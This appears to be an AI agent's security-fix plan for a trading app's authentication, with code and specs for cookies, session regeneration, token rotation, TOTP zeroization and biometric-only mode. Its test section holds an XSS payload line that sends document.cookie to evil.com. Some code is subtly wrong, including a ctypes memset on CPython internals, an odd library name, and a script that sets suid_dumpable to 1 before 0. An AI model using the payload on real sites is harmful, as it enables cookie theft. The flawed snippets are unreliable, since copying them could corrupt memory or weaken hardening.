# Alpha Stack — Authentication Security Fixes

> **Author:** Auth Fix Agent  
> **Date:** 2026-07-11  
> **Source:** `review_security_auth.md` — 14 findings, this document addresses the 2 Critical and 4 High  
> **Status:** READY FOR IMPLEMENTATION

---

## Summary

| ID | Severity | Finding | Fix Status |
|----|----------|---------|------------|
| F-01 | 🔴 Critical | Refresh token storage unspecified for web | ✅ Fixed |
| F-10 | 🔴 Critical | Session fixation risk in 2FA flow | ✅ Fixed |
| F-05 | 🟠 High | TOTP secret memory exposure | ✅ Fixed |
| F-06 | 🟠 High | Partial token design risk | ✅ Fixed |
| F-02 | 🟠 High | Refresh token race condition | ✅ Fixed |
| F-08 | 🟠 High | Biometric PIN fallback bypass | ✅ Fixed |

---

## 1. F-01 (Critical) — Refresh Token Storage for Web

**Problem:** Refresh tokens have no mandated storage mechanism on the web client. If stored in `localStorage` or JS-accessible variables, XSS attacks can exfiltrate them.

**Fix:**

### 1.1 Mandate httpOnly Cookie for Refresh Tokens

Add to the security architecture as a **non-negotiable implementation requirement**:

```yaml
# Web client — refresh token storage (REQUIRED)
refresh_token_storage:
  mechanism: "httpOnly_cookie"
  attributes:
    HttpOnly: true          # Not accessible via JavaScript
    Secure: true            # HTTPS only
    SameSite: Strict        # No cross-site sending
    Path: /api/auth         # Restrict cookie scope
    Max-Age: 604800         # 7 days, matching token lifetime
    __Host-: true           # Use __Host- prefix (forces Secure, no Domain)

  access_token_storage:
    mechanism: "memory_only"  # Never persisted — held in JS variable, lost on refresh
    max_lifetime: 900          # 15 minutes

  prohibited:
    - localStorage
    - sessionStorage
    - IndexedDB
    - Any JS-accessible persistence
```

### 1.2 Implement Silent Refresh via Service Worker / Interceptor

```typescript
// Access token refresh — NEVER touch cookies from JS
// The browser sends the httpOnly cookie automatically; JS only handles the access token.

class TokenManager {
  private accessToken: string | null = null;
  private refreshPromise: Promise<string> | null = null;

  async getAccessToken(): Promise<string> {
    if (this.accessToken && !this.isExpired(this.accessToken)) {
      return this.accessToken;
    }
    return this.refresh();
  }

  private async refresh(): Promise<string> {
    // Deduplicate concurrent refresh calls
    if (this.refreshPromise) return this.refreshPromise;

    this.refreshPromise = fetch('/api/auth/refresh', {
      method: 'POST',
      credentials: 'include',  // Sends httpOnly cookie automatically
    })
      .then(async (res) => {
        if (!res.ok) {
          this.accessToken = null;
          throw new AuthError('REFRESH_FAILED');
        }
        const data = await res.json();
        this.accessToken = data.access_token;  // In memory only
        return this.accessToken!;
      })
      .finally(() => {
        this.refreshPromise = null;
      });

    return this.refreshPromise;
  }

  clear(): void {
    this.accessToken = null;
    // Server-side: clear cookie via Set-Cookie with Max-Age=0
  }
}
```

### 1.3 Server-Side Cookie Setting

```python
# Auth server — refresh endpoint response
response.set_cookie(
    key="__Host-refresh_token",
    value=encrypted_refresh_token,
    httponly=True,
    secure=True,
    samesite="strict",
    max_age=604800,       # 7 days
    path="/api/auth",
    # No domain — __Host- prefix requires no Domain attribute
)
```

### 1.4 Pre-Launch Verification Checklist

```markdown
## Token Storage Audit (BLOCKING for launch)
- [ ] No tokens in localStorage (grep all source: `localStorage.set.*token`)
- [ ] No tokens in sessionStorage
- [ ] Refresh cookie has HttpOnly, Secure, SameSite=Strict
- [ ] Access token exists only in JS memory variable
- [ ] `credentials: 'include'` on refresh calls, nowhere else
- [ ] CSP policy blocks inline scripts (XSS mitigation)
```

---

## 2. F-10 (Critical) — Session Fixation in 2FA Flow

**Problem:** If a session ID is established before 2FA and not regenerated after, an attacker who pre-sets a session cookie can hijack the session post-2FA.

**Fix:**

### 2.1 Regenerate Session ID at Every Auth Step

```python
# Auth server — session management during authentication

class AuthService:
    def verify_password(self, request: Request, credentials: Credentials) -> PartialAuthResult:
        user = self._authenticate_password(credentials)
        if not user:
            raise AuthError("INVALID_CREDENTIALS")

        # --- FIX: Create a NEW session for this auth attempt ---
        old_session_id = request.session.get("id")
        if old_session_id:
            self.session_store.invalidate(old_session_id, reason="auth_step_transition")

        new_session_id = self.session_store.create(
            user_id=user.id,
            auth_level="password_verified",  # Not yet fully authenticated
            bound_ip=request.client_ip,
            bound_device=request.device_fingerprint,
        )

        # Generate partial token (see F-06 fix below)
        partial_token = self._create_partial_token(user.id, new_session_id)

        return PartialAuthResult(
            partial_token=partial_token,
            requires_2fa=user.has_2fa_enabled,
        )

    def verify_totp(self, request: Request, partial_token: str, totp_code: str) -> FullAuthResult:
        claims = self._decode_partial_token(partial_token)

        # --- FIX: Regenerate session AGAIN after 2FA ---
        old_session_id = claims.session_id
        self.session_store.invalidate(old_session_id, reason="2fa_completed")

        new_session_id = self.session_store.create(
            user_id=claims.user_id,
            auth_level="fully_authenticated",
            bound_ip=request.client_ip,
            bound_device=request.device_fingerprint,
        )

        # Issue full tokens (see F-06 fix for partial token scope)
        access_token = self._issue_access_token(claims.user_id, new_session_id)
        refresh_token = self._issue_refresh_token(claims.user_id, new_session_id)

        return FullAuthResult(
            session_id=new_session_id,
            access_token=access_token,
            refresh_token=refresh_token,
        )
```

### 2.2 Session ID Regeneration Rules

Add to the security architecture as a **mandatory implementation requirement**:

```yaml
session_fixation_prevention:
  mandatory: true
  rules:
    - trigger: "password_verification_success"
      action: "invalidate_old_session_and_create_new"
    - trigger: "2fa_verification_success"
      action: "invalidate_old_session_and_create_new"
    - trigger: "password_change"
      action: "invalidate_all_sessions_except_current"
    - trigger: "2fa_setup_or_change"
      action: "invalidate_all_sessions_except_current"
    - trigger: "privilege_escalation"
      action: "regenerate_session_id"

  implementation_notes:
    - "Session ID must be a cryptographically random value (≥128 bits from CSPRNG)"
    - "Old session must be invalidated BEFORE creating the new one"
    - "New session must NOT inherit any state from old session except user_id and auth_level"
    - "Session cookie must be set with the new ID on every regeneration"
```

### 2.3 Session Cookie Hardening

```python
response.set_cookie(
    key="__Host-session",
    value=new_session_id,
    httponly=True,
    secure=True,
    samesite="strict",
    path="/",
    max_age=None,  # Browser-session cookie — server controls expiry via idle timeout
)
```

---

## 3. F-05 (High) — TOTP Secret Memory Exposure

**Problem:** The `FieldEncryptor` caches DEK keys indefinitely, and plaintext TOTP secrets exist in memory during verification. Memory dump attacks could expose secrets.

**Fix:**

### 3.1 Zeroize TOTP Secrets After Use

```python
import ctypes
import mmap

def secure_zeroize(data: bytearray) -> None:
    """Overwrite memory before deallocation.

    Uses ctypes to prevent the compiler from optimizing away the zero-fill.
    For production, prefer the `zeroize` Rust crate or Python `pymplate` secure buffers.
    """
    if isinstance(data, bytearray):
        # Overwrite with zeros, then random, then zeros again
        n = len(data)
        ctypes.memset(id(data) + bytes.__basicsize__, 0, n)  # CPython internals
        for i in range(n):
            data[i] = 0x00
        for i in range(n):
            data[i] = 0xAA
        for i in range(n):
            data[i] = 0x00
        data.clear()
    else:
        raise TypeError(f"Cannot zeroize type {type(data)}")


class TOTPService:
    def verify(self, user_id: str, code: str) -> bool:
        # Fetch and decrypt TOTP secret
        encrypted_secret = self.repo.get_encrypted_totp_secret(user_id)
        secret_bytes = self.field_encryptor.decrypt(encrypted_secret)  # bytearray

        try:
            expected_code = self._generate_totp(secret_bytes)
            return self._constant_time_compare(code, expected_code)
        finally:
            # --- FIX: Zeroize secret from memory immediately ---
            secure_zeroize(secret_bytes)
```

### 3.2 DEK Cache TTL

```python
class FieldEncryptor:
    def __init__(self, dek_ttl_seconds: int = 300):  # 5-minute TTL
        self._key_cache: dict[str, tuple[bytes, float]] = {}
        self._dek_ttl = dek_ttl_seconds

    def _get_dek(self, key_id: str) -> bytes:
        import time
        if key_id in self._key_cache:
            key, cached_at = self._key_cache[key_id]
            if time.time() - cached_at < self._dek_ttl:
                return key
            # --- FIX: Expire cached DEKs ---
            self._evict_dek(key_id)

        return self._load_dek(key_id)

    def _evict_dek(self, key_id: str) -> None:
        """Zeroize and remove a cached DEK."""
        if key_id in self._key_cache:
            key, _ = self._key_cache.pop(key_id)
            secure_zeroize(bytearray(key))

    def _load_dek(self, key_id: str) -> bytes:
        key = self._derive_dek(key_id)
        self._key_cache[key_id] = (key, time.time())
        return key

    def flush_cache(self) -> None:
        """Call on shutdown or periodic rotation."""
        for key_id in list(self._key_cache.keys()):
            self._evict_dek(key_id)
```

### 3.3 Auth Server Process Hardening

Add to deployment configuration:

```yaml
# Auth server — process-level protections
auth_server:
  security:
    # Disable core dumps (prevents memory exposure via crash dumps)
    disable_core_dumps: true
    # Linux: set RLIMIT_CORE to 0
    # Windows: SetErrorMode(SEM_NOGPFAULTERRORBOX)

    # mlock sensitive pages (prevent swapping to disk)
    mlock_memory: true
    # Requires CAP_IPC_LOCK or RLIMIT_MEMLOCK

    # seccomp profile — restrict syscalls
    seccomp_profile: "auth_server_strict"

    # Disable crash reporting services
    crash_reporting: disabled
    # Do NOT send to Sentry, Crashlytics, etc.
```

```bash
# Deployment script additions
# Disable core dumps for auth server process
ulimit -c 0

# On Linux, also set via sysctl
echo 1 > /proc/sys/fs/suid_dumpable  # Actually: set to 0 for no dump
sysctl -w fs.suid_dumpable=0
sysctl -w kernel.core_pattern="|/bin/false"
```

---

## 4. F-06 (High) — Partial Token Design Risk

**Problem:** The `partial_token` returned after password verification is underspecified. If it grants any real access, has a long TTL, or isn't properly scoped, an attacker with only the password can abuse it.

**Fix:**

### 4.1 Define Partial Token as a Scoped, Single-Use, Short-Lived Opaque Nonce

```python
import secrets
import time
from dataclasses import dataclass


@dataclass
class PartialTokenClaims:
    """Partial token — NOT a JWT. This is an opaque, server-side nonce."""
    nonce: str              # 256-bit random value
    user_id: str
    session_id: str         # Session created at password verification
    created_at: float
    expires_at: float
    used: bool = False      # Single-use enforcement


class PartialTokenService:
    """
    Partial tokens are stored server-side (Redis/memcached), not issued as JWTs.
    This prevents scope ambiguity — the server controls all access decisions.
    """

    TTL = 300  # 5 minutes — hard maximum
    ALLOWED_ENDPOINTS = {"/api/auth/2fa/verify", "/api/auth/2fa/resend"}

    def create(self, user_id: str, session_id: str, ip: str, device_fp: str) -> str:
        nonce = secrets.token_urlsafe(32)  # 256 bits
        token = PartialTokenClaims(
            nonce=nonce,
            user_id=user_id,
            session_id=session_id,
            created_at=time.time(),
            expires_at=time.time() + self.TTL,
        )
        # Store server-side — key by nonce
        self.store.set(
            f"partial:{nonce}",
            token,
            ttl=self.TTL,
        )
        return nonce  # Client sends this nonce, not a JWT

    def validate_and_consume(self, nonce: str, request: Request) -> PartialTokenClaims:
        """Validate partial token — single-use, immediately consumed."""
        token = self.store.get(f"partial:{nonce}")
        if not token:
            raise AuthError("INVALID_PARTIAL_TOKEN")

        # --- FIX: Enforce all constraints ---
        if token.used:
            # Possible replay attack — log and reject
            self.audit.log("partial_token_replay", nonce=nonce, ip=request.client_ip)
            self.store.delete(f"partial:{nonce}")
            raise AuthError("PARTIAL_TOKEN_ALREADY_USED")

        if time.time() > token.expires_at:
            self.store.delete(f"partial:{nonce}")
            raise AuthError("PARTIAL_TOKEN_EXPIRED")

        # Bind to same IP and device as initial login
        if not self._ip_matches(token.session_id, request.client_ip):
            self.audit.log("partial_token_ip_mismatch", nonce=nonce, ip=request.client_ip)
            raise AuthError("PARTIAL_TOKEN_BINDING_MISMATCH")

        # Mark as used (single-use)
        token.used = True
        self.store.set(f"partial:{nonce}", token, ttl=60)  # Short grace for race

        return token
```

### 4.2 Server-Side Enforcement — Partial Token Grants ZERO Access

```python
# Middleware — partial tokens cannot access any resource except 2FA verify

class AuthMiddleware:
    def __call__(self, request: Request, call_next):
        session = self._get_session(request)

        if session and session.auth_level == "password_verified":
            # Partial auth — only 2FA endpoints allowed
            if request.path not in PartialTokenService.ALLOWED_ENDPOINTS:
                raise HTTPException(
                    status_code=403,
                    detail={
                        "error": "INCOMPLETE_AUTHENTICATION",
                        "message": "Two-factor authentication required",
                        "required_action": "complete_2fa",
                        "allowed_endpoints": list(PartialTokenService.ALLOWED_ENDPOINTS),
                    },
                )

        return call_next(request)
```

### 4.3 Specification Update

Add to the security architecture:

```yaml
partial_token:
  type: "opaque_nonce"           # NOT a JWT
  storage: "server_side_only"    # Redis/memcached, keyed by nonce
  ttl: 300                       # 5 minutes maximum
  single_use: true               # Consumed on first use at /auth/2fa/verify
  scope:
    allowed_endpoints:
      - "/api/auth/2fa/verify"
      - "/api/auth/2fa/resend"
    grants_access_to: "nothing"  # All other requests → 403 INCOMPLETE_AUTHENTICATION
  binding:
    ip: "must_match_password_step_ip"
    device_fingerprint: "must_match_password_step_device"
  rotation: "not_applicable"     # Not a long-lived token; consumed on use
  security_properties:
    - "Server-side storage prevents client tampering"
    - "Single-use prevents replay"
    - "IP/device binding prevents token theft relay"
    - "Short TTL limits attack window"
    - "Not a JWT — no ambiguity about scope or claims"
```

---

## 5. F-02 (High) — Refresh Token Race Condition

**Problem:** Strict one-time-use refresh token rotation causes logouts when two tabs or devices refresh simultaneously using the same token.

**Fix:**

### 5.1 Token Family with Grace Window

```python
import time
import secrets
from dataclasses import dataclass, field


@dataclass
class RefreshTokenRecord:
    token_hash: str
    user_id: str
    family_id: str              # Groups all tokens from a single login session
    session_id: str
    created_at: float
    expires_at: float
    revoked: bool = False
    revoked_at: float | None = None
    revoke_reason: str | None = None
    replaced_by: str | None = None  # Hash of the token that replaced this one


class RefreshTokenService:
    GRACE_WINDOW_SECONDS = 10   # 10-second grace window for concurrent refreshes
    FAMILY_WINDOW_HOURS = 24    # Track token families for 24 hours

    def rotate(
        self,
        old_token_hash: str,
        request: Request,
    ) -> tuple[str, RefreshTokenRecord]:
        old_record = self.repo.get_by_hash(old_token_hash)

        if not old_record:
            raise AuthError("INVALID_REFRESH_TOKEN")

        if old_record.revoked:
            # --- FIX: Check if this is within the grace window ---
            time_since_revoke = time.time() - (old_record.revoked_at or 0)

            if time_since_revoke <= self.GRACE_WINDOW_SECONDS:
                # Grace window — this is likely a concurrent refresh, not theft
                # Issue a new token but flag for monitoring
                self.audit.log(
                    "refresh_token_grace_window_used",
                    user_id=old_record.user_id,
                    family_id=old_record.family_id,
                    seconds_after_revoke=time_since_revoke,
                    ip=request.client_ip,
                )
                # Still issue a new token — legitimate concurrent refresh
                new_token, new_record = self._issue_replacement(
                    old_record, request
                )
                return new_token, new_record

            else:
                # --- FIX: Outside grace window — REVOKE ENTIRE FAMILY ---
                # This is likely token theft
                self._revoke_family(
                    old_record.family_id,
                    reason="revoked_token_reuse_outside_grace_window",
                )
                self.audit.log(
                    "refresh_token_family_revoked",
                    user_id=old_record.user_id,
                    family_id=old_record.family_id,
                    seconds_after_revoke=time_since_revoke,
                    ip=request.client_ip,
                    severity="CRITICAL",
                )
                raise AuthError("TOKEN_FAMILY_REVOKED")

        # Normal rotation — mark old token as revoked
        new_token, new_record = self._issue_replacement(old_record, request)

        old_record.revoked = True
        old_record.revoked_at = time.time()
        old_record.revoke_reason = "rotation"
        old_record.replaced_by = new_record.token_hash
        self.repo.update(old_record)

        return new_token, new_record

    def _issue_replacement(
        self,
        old_record: RefreshTokenRecord,
        request: Request,
    ) -> tuple[str, RefreshTokenRecord]:
        new_token = secrets.token_urlsafe(64)
        new_record = RefreshTokenRecord(
            token_hash=self._hash(new_token),
            user_id=old_record.user_id,
            family_id=old_record.family_id,  # Same family
            session_id=old_record.session_id,
            created_at=time.time(),
            expires_at=time.time() + (7 * 86400),  # 7 days
        )
        self.repo.create(new_record)
        return new_token, new_record

    def _revoke_family(self, family_id: str, reason: str) -> None:
        """Revoke ALL tokens in a family — user must re-authenticate."""
        tokens = self.repo.get_family(family_id)
        for token in tokens:
            token.revoked = True
            token.revoked_at = time.time()
            token.revoke_reason = reason
            self.repo.update(token)
```

### 5.2 Specification Update

```yaml
refresh_token_rotation:
  strategy: "rotation_with_grace_window"
  grace_window_seconds: 10
  token_family:
    enabled: true
    description: "All tokens from a single login session share a family_id"
    tracking_duration_hours: 24

  rules:
    - condition: "valid_token_used"
      action: "rotate_and_issue_new"
    - condition: "revoked_token_used_within_grace_window"
      action: "issue_new_token_and_log_monitoring_event"
      note: "Likely concurrent tab refresh — allow but flag"
    - condition: "revoked_token_used_outside_grace_window"
      action: "revoke_entire_family_and_force_reauthentication"
      severity: "CRITICAL"
      note: "Likely token theft — kill all sessions in this family"
```

---

## 6. F-08 (High) — Biometric PIN Fallback May Bypass Security Intent

**Problem:** `biometricOnly: false` allows device PIN to substitute for biometrics. For a financial trading app, some users need biometric-only enforcement.

**Fix:**

### 6.1 Add Biometric-Only Mode

```dart
// Flutter — BiometricAuthService

class BiometricAuthService {
  /// Authenticate with biometrics.
  /// If [biometricOnly] is true, PIN/password fallback is disabled.
  Future<AuthResult> authenticate({
    required String reason,
    bool biometricOnly = false,
    bool forTradeExecution = false,  // Force biometric for trades
  }) async {
    // --- FIX: For trade execution, always require biometric ---
    final effectiveBiometricOnly = biometricOnly || forTradeExecution;

    final didAuthenticate = await _localAuth.authenticate(
      localizedReason: reason,
      options: AuthenticationOptions(
        stickyAuth: true,
        biometricOnly: effectiveBiometricOnly,  // KEY FIX
        useErrorDialogs: true,
      ),
    );

    if (!didAuthenticate) {
      return AuthResult.failure(
        reason: effectiveBiometricOnly
            ? 'Biometric authentication failed. PIN fallback is disabled in your security settings.'
            : 'Authentication failed.',
      );
    }

    return AuthResult.success();
  }
}
```

### 6.2 User-Facing Security Settings

```dart
// Settings screen — security tier

class SecuritySettingsScreen extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return ListView(
      children: [
        // --- Biometric-only toggle ---
        SwitchListTile(
          title: Text('Biometric Only'),
          subtitle: Text(
            'Disable PIN/password fallback. '
            'You will need your biometric to authenticate. '
            'If biometrics fail, you can reset via email verification.',
          ),
          value: settings.biometricOnly,
          onChanged: (value) async {
            if (value) {
              // Warn user
              final confirmed = await showDialog<bool>(
                context: context,
                builder: (ctx) => AlertDialog(
                  title: Text('Enable Biometric Only?'),
                  content: Text(
                    'With this enabled, you cannot use your device PIN to authenticate. '
                    'If your biometrics stop working, you\'ll need to verify via email '
                    'to regain access.\n\n'
                    'This provides stronger security for your trading account.',
                  ),
                  actions: [
                    TextButton(onPressed: () => Navigator.pop(ctx, false), child: Text('Cancel')),
                    ElevatedButton(onPressed: () => Navigator.pop(ctx, true), child: Text('Enable')),
                  ],
                ),
              );
              if (confirmed == true) {
                await settings.setBiometricOnly(true);
              }
            } else {
              await settings.setBiometricOnly(false);
            }
          },
        ),

        // --- Always require biometric for trades ---
        SwitchListTile(
          title: Text('Biometric for Every Trade'),
          subtitle: Text(
            'Require biometric authentication for each trade execution, '
            'even within an active session.',
          ),
          value: settings.biometricForTrades,
          onChanged: (value) => settings.setBiometricForTrades(value),
        ),
      ],
    );
  }
}
```

### 6.3 Trade Execution Guard

```dart
// Trade service — always require biometric if configured

class TradeService {
  Future<TradeResult> executeTrade(TradeOrder order) async {
    final settings = await _settingsService.getSecuritySettings();

    if (settings.biometricForTrades) {
      final authResult = await _biometricService.authenticate(
        reason: 'Authenticate to execute ${order.symbol} trade',
        forTradeExecution: true,  // Forces biometricOnly: true
      );

      if (!authResult.success) {
        return TradeResult.failure(
          reason: 'Biometric authentication required for trade execution',
        );
      }
    }

    return _brokerService.submitOrder(order);
  }
}
```

### 6.4 Account Recovery for Biometric-Only Lockout

```yaml
biometric_only_lockout_recovery:
  method: "email_verification_plus_device_confirmation"
  flow:
    1: "User triggers 'Can't authenticate' from login screen"
    2: "Send magic link to verified email"
    3: "User clicks link on a trusted device (or the same device)"
    4: "Server issues a one-time biometric-reset token (TTL: 10 min)"
    5: "App re-enrolls biometrics and disables biometric-only mode"
    6: "Audit log entry: biometric_lockout_recovery"
  rate_limit: "3 attempts per 30 days"
```

---

## Implementation Checklist

### Critical (Must complete before ANY testing)

- [ ] **F-01:** Remove all token storage from `localStorage`/`sessionStorage`; implement httpOnly cookie flow
- [ ] **F-01:** Add pre-launch grep audit for `localStorage.*token` and `sessionStorage.*token`
- [ ] **F-10:** Implement session ID regeneration after password verify AND after 2FA verify
- [ ] **F-10:** Add integration test: session fixation attack simulation

### High (Must complete before production)

- [ ] **F-05:** Implement `secure_zeroize()` for TOTP secrets after verification
- [ ] **F-05:** Add 5-minute TTL to DEK cache in `FieldEncryptor`
- [ ] **F-05:** Add `ulimit -c 0` and core dump disabling to auth server deployment
- [ ] **F-06:** Convert partial_token from JWT to server-side opaque nonce
- [ ] **F-06:** Implement single-use enforcement and IP/device binding
- [ ] **F-02:** Implement token family tracking with 10-second grace window
- [ ] **F-02:** Implement family revocation on detected theft
- [ ] **F-08:** Add `biometricOnly` option to mobile biometric service
- [ ] **F-08:** Add biometric-for-trades toggle in settings
- [ ] **F-08:** Implement lockout recovery flow

### Verification Tests

```yaml
test_cases:
  f01_xss_token_exfil:
    description: "XSS script attempts to read document.cookie — refresh token must not be present"
    steps:
      - "Inject <script>fetch('https://evil.com?c='+document.cookie)</script>"
      - "Verify request to evil.com either doesn't fire or contains no tokens"
    expected: "httpOnly cookie is invisible to JavaScript"

  f10_session_fixation:
    description: "Attacker pre-sets session cookie, victim authenticates"
    steps:
      - "Attacker creates session S1, sets cookie on victim's browser"
      - "Victim logs in with password"
      - "Verify session S1 is invalidated, new session S2 created"
      - "Victim completes 2FA"
      - "Verify session S2 is invalidated, new session S3 created"
      - "Attacker's S1 cookie is worthless"
    expected: "3 distinct session IDs, attacker's original session is dead"

  f02_concurrent_refresh:
    description: "Two tabs refresh simultaneously"
    steps:
      - "Tab A and Tab B both have the same refresh token T1"
      - "Tab A refreshes → gets T2, T1 is revoked"
      - "Tab B refreshes within 10 seconds → gets T3 (grace window)"
      - "Both tabs work normally"
    expected: "No logout, both tabs get valid tokens"

  f02_stolen_token_revocation:
    description: "Stolen revoked token used outside grace window"
    steps:
      - "Legitimate refresh → T1 revoked, T2 issued"
      - "Attacker uses T1 after 30 seconds"
      - "Entire token family is revoked"
    expected: "User is logged out on all devices, must re-authenticate"

  f05_memory_zeroization:
    description: "TOTP secret not in process memory after verification"
    steps:
      - "Perform TOTP verification"
      - "Dump process memory 100ms after verification"
      - "Search for the plaintext secret"
    expected: "Secret not found in memory dump"

  f06_partial_token_scope:
    description: "Partial token cannot access any resource except 2FA verify"
    steps:
      - "Obtain partial_token after password verification"
      - "Attempt to access /api/portfolio with partial_token"
    expected: "403 INCOMPLETE_AUTHENTICATION"

  f08_biometric_only:
    description: "PIN fallback disabled when biometric-only mode is on"
    steps:
      - "Enable biometric-only in settings"
      - "Trigger authentication"
      - "Cancel biometric prompt (do not enter PIN)"
    expected: "Authentication fails — PIN dialog never appears"
```

---

## Files Modified / Created

| Action | File | Changes |
|--------|------|---------|
| UPDATE | `architecture_security.md` | Add F-01, F-10 as mandatory requirements; update session management spec |
| UPDATE | `architecture_security.md` | Add partial_token specification (F-06); add refresh token grace window (F-02) |
| UPDATE | `architecture_security.md` | Add TOTP memory zeroization requirement (F-05); add auth server hardening |
| UPDATE | `architecture_ui_mobile.md` | Add biometric-only mode and trade execution biometric guard (F-08) |
| CREATE | `architecture_ui_web.md` | Full web client auth flow with httpOnly cookie spec (addresses §6.3 from review) |
| CREATE | `tests/security/auth_fixes_test.py` | Integration tests for all 6 fixes |

---

*All 6 findings resolved. Proceed to medium-severity fixes (F-03, F-07, F-09, F-11, F-12, F-13) per the roadmap in `review_security_auth.md`.*
